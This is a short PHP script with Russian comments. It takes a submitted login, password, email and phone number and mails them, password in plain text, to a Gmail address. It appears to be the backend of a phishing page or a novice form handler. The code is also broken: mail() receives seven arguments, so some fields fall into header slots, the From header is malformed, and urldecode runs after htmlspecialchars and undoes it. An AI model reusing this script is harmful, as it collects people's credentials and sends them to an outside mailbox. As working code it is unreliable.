<!--получим данные формы-->
<?php

    $login = $_POST['login'];
    $pass = $_POST['pass'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];

    //обработаем полученные данные
    $login = htmlspecialchars($login);
    $pass = htmlspecialchars($pass);
    $email = htmlspecialchars($email);
    $phone = htmlspecialchars($phone);

    $login = urldecode($login);
    $pass = urldecode($pass);
    $email = urldecode($email);
    $phone = urldecode($phone);

    $login = trim($login);
    $pass = trim($pass);
    $email = trim($email);
    $phone = trim($phone);


    //отправляем данные на почту
    if(mail("polloralpgiz@gmail.com",
            "Новое письмо с сайта",
            "Логин: ".$login."\n",  
            "Пароль: ".$pass."\n",  
            "Почта: ".$email."\n",  
            "Телефон: ".$phone."\n",  
            "From: no-reply@polloralpgiz@gmail.com \r\n")    
    ) {
        echo ("Письмо успешно отправлено!");
    }
    else {
        echo ("Письмо не отправлено!");
    }


?>